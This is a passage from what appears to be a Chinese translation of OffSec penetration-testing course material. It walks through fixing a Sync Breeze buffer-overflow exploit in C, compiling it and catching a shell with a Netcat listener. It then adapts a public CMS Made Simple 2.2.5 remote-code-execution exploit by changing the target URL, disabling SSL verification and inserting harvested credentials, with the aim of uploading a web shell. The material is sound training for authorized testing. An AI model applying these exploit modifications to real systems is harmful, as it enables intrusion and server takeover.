
列表 326 - 使用 `malloc` 为初始缓冲区分配内存

这个数字看起来很熟悉。在本模块的开始，我们注意到 780 是覆盖栈上返回地址并控制 `EIP` 寄存器所需的字节偏移量。

`malloc` 函数仅根据请求的大小分配一块内存。该缓冲区需要经过正确初始化，这是在调用 `malloc` 之后立即使用 `memset` 函数（496）完成的。

```c
memset(padding, 0x41, initial_buffer_size);
```

`memset` 将用特定字符填充内存，在我们的案例中是 `'0x41'`，ASCII 中字符 `'A'` 的十六进制表示。

下一行代码特别有趣。我们发现了一个 `memset` 的调用，它将最后一个字节设置为 NULL 字节。

```c
memset(padding + 1, initial_buffer_size - 1, 0x00, 1);
```

列表 328 - 将最后一个字节设置为空终止符以缓冲区转换为字符串

这初看起来很令人困惑；然而，继续阅读代码，我们到达了创建缓冲区的地方。

```c
char *buffer = malloc(buffer_length);
memset(buffer, 0x00, buffer_length);
strcpy(buffer, request_one);
strcat(buffer, content_length_string);
strcat(buffer, request_two);
strcat(buffer, padding);
strcat(buffer, retn);
strcat(buffer, shellcode);
strcat(buffer, request_three);
```

列表 329 - 为漏洞创建最终缓冲区

代码首先通过 `malloc` 为缓冲区字符数组分配一个内存块，并用 NULL 字节填充数组。接下来的代码将通过 `strcpy`（697）和 `strcat`（698）等字符串处理函数通过复制其他变量的内容来填充缓冲区字符数组。

知道最终缓冲区必须被构建为字符串是非常重要的。C 编程语言使用空终止字符串（699），这意味着像 `strcpy` 和 `strcat` 等函数通过在目标字符数组中搜索第一个出现的 NULL 字节来确定字符串的结束和大小。由于我们初始填充缓冲区的分配大小为 780，通过将最后一个字节设置为 `0x00`，我们最终拼接（`strcat`）了长度为 779 字节的 `"A"` 字符链。这解释了 `EIP` 的错位覆盖。

我们可以通过将 `initial_buffer_size` 变量请求的内存大小增加一个来快速修复这种错位。

```c
int initial_buffer_size = 781;
char *padding = malloc(initial_buffer_size);
memset(padding, 0x41, initial_buffer_size);
memset(padding + initial_buffer_size - 1, 0x00, 1);
```

列表 330 - 修改填充分配大小

作为最后的测试，我们将编译漏洞，在端口 443 上设置 Netcat 监听器，并启动漏洞。

```bash
gcc breeze.c -o syncbreeze-exploit.exe
nc -lvp 443
./syncbreeze-exploit.exe
```

[>] 正在初始化 Winsock...
[>] 已初始化。
[>] Socket 已创建。
[>] 已连接

[>] 请求已发送

太棒了！我们 shell。此漏洞不再需要基于 Windows 的攻击平台，因为我们可以从 Kali 运行它。

![](img/987dc9f6ebd8893c565a1d124d7724e6_443_0.png)

# OffSec

使用 Kali Linux 进行渗透测试

## 14.2 修复漏洞

本单元涵盖以下学习目标：

- 修复应用程序漏洞
- 解决常见的应用程序问题

Web应用程序漏洞通常不会导致内存损坏。由于它们不受操作系统提供的 DEP 和 ASLR 等保护措施的影响，因此更容易被利用。然而，正如我们在之前的模块中学到的，Web应用程序漏洞经常会导致数据库信息泄露甚至完全控制系统。

### 14.2.1 考虑因素与概述

即使我们可能不需要在Web漏洞中处理十六进制编码负载，阅读代码并理解在编辑过程中必须考虑的因素也是重要的。

在修改Web漏洞时，我们通常需要针对代码提出几个关键问题：

- 它是否发起 HTTP 或 HTTPS 连接？
- 它是否访问特定的Web应用程序路径或路由？
- 漏洞是否利用了未身份验证？
- 如果不是，漏洞如何验证应用程序身份？
- 如何构造 GET 或 POST 请求来触发漏洞？是否存在 HTTP 方法？
- 是否依赖默认应用程序设置（例如应用程序的Web路径），这些设置在安装后可能会更改？
- 自签名证书是否会破坏漏洞？

我们必须意识到，公开的Web漏洞没有考虑到 `.htaccess` 文件或Web应用程序防火墙（WAF）等额外保护。这主要是因为漏洞作者在开发过程中不可能知道所有这些保护措施，因此它们不在范围之内。

### 14.2.2 选择漏洞并修复代码

让我们考虑以下场景：在评估期间，我们发现了一个暴露了 `apache2` 服务的 Linux 主机。在枚举 Web 服务器后，我们发现安装了 CMS

# OffSec

CMS Made Simple 版本 2.2.5 正在 TCP 端口 443 上监听。此版本似乎存在远程代码执行漏洞，且 Exploit-DB 上有一个公开的利用程序。

虽然此漏洞不需要身份验证后即可触发，但在信息收集过程中，我们在另一台机器上发现了有效的应用程序凭据（admin / HUYfaw763）。

我们的计划是将通用的公开利用程序获取到目标，获取远程代码执行，并最终上传一个 web shell 以获得对服务器的控制。

当我们检查代码时，发现 `base_url` 变量需要修改以匹配我们的环境。

```
base_url = "http://192.168.1.10/cmsms/admin/"
```

列表 334 - 原始利用程序中定义的 `base_url` 变量

让我们修改 IP 地址并将协议更改为 HTTPS，以反映我们的 Debian 虚拟机目标：

```
base_url = "https://192.168.50.120/admin/"
```

列表 335 - 更新以匹配我们案例的 `base_url` 变量

我们还注意到，在浏览网站时，出现了 `SEC_ERROR_UNKNOWN_ISSU` 错误。这表明远程主机无法通过验证。我们需要在利用代码中考虑到这一点。

具体来说，该利用程序使用 Python 库与目标通信。代码在第 34、55 和 80 行执行了三次 POST 请求：

```
response = requests.post(url, data=data, allow_redirects=False)
response = requests.post(url, data=data, files=txt, cookies=cookies)
response = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
```

列表 336 - 原始利用程序中定义的三个 POST 请求

此外，官方文档指出，如果将参数设置为 `"False"`，则 SSL 证书将被忽略。

```
response = requests.post(url, data=data, allow_redirects=False, verify=False)
response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
```

列表 337 - 忽略 SSL 验证的修改 POST 请求。

# OffSec

使用 Kali Linux 进行渗透测试

最后，我们还需要更改原始利用程序中使用的凭据，以与信息收集过程中发现的凭据一致。这些分别定义在第 15 和 16 行的 `username` 和 `password` 变量中。

```
username = "admin"
password = "password"
```

列表 338 - 原始利用程序中定义的 `username` 和 `password` 变量

我们可以轻松地替换这些凭据。

```
username = "admin"
password = "HUYfaw763"
```
